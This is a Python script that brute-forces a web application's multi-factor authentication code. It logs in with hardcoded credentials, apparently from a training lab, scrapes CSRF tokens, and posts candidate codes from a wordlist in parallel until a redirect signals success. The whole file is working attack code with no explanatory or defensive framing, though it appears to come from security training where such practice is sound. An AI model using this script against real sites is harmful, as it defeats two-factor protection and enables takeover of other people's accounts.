import argparse
import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool, cpu_count

parser = argparse.ArgumentParser(description='Script to brute-force the mfa-code')
parser.add_argument('url', type=str, help='URL of the target web application')
parser.add_argument('-w', '--wordlist', type=str, help='Path to the wordlist file', required=True)
args = parser.parse_args()

def process_mfa_code(mfa_code):
    session = requests.Session()
    response = session.get(f'{args.url}/login')
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    login_data = {'username': 'carlos', 'password': 'montoya', 'csrf': csrf_token}
    response = session.post(f'{args.url}/login', data=login_data)
    soup = BeautifulSoup(response.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    login2_data = {'mfa-code': mfa_code, 'csrf': csrf}
    response = session.post(f'{args.url}/login2', data=login2_data, allow_redirects=False)
    if response.status_code == 302:
        print(f'Success! mfa-code is {mfa_code}')
        return mfa_code
    else:
        print(f'mfa-code {mfa_code} failed')
        return None

if __name__ == '__main__':
    with open(args.wordlist, 'r') as f:
        mfa_codes = [line.strip() for line in f]
        with Pool(cpu_count()) as p:
            results = p.map(process_mfa_code, mfa_codes)
        success = [r for r in results if r is not None]
        if len(success) > 0:
            print(f'Successful mfa-code: {success[0]}')
        else:
            print('All mfa-codes failed')
